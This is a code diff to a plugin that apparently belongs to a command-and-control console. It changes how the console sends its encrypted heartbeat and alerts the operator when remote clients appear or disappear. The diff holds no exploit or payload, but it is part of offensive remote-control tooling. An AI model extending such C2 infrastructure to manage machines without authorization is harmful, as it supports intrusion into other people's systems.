@@ -40,7 +40,8 @@ class Plugin:
         while True:
             payload = {
             "client_id" : "c2",
-            "command" : "heartbeat"
+            "command" : "heartbeat",
+            "data" : "none"
         }
             msg = self.encrypt_msg(json.dumps(payload), self.aes_secret)
             try:
@@ -51,12 +52,15 @@ class Plugin:
                 data = json.loads(data.decode())
                 for key, val in data.items():
                     if key not in self.clients:
-                        self.console.log("New Client")
-                        #self.async_alert(alert_msg = f"New Client: {key}")
+                        try:
+                            self.async_alert(alert_msg = f"New Client: {key}")
+                        except:
+                            pass
+                        
                         self.clients[key] = val
                 for key in list(self.clients):
                     if key not in data:
-                        self.console.log(f"Lost Client: {key}")
+                        self.async_alert(alert_msg = f"Lost Client: {key}")
                         if key == self.client:
                             self.client = None
                             self.async_update_prompt("(Connected): ")
@@ -64,4 +68,3 @@ class Plugin:
                 time.sleep(5)
             except:
                 break
-            
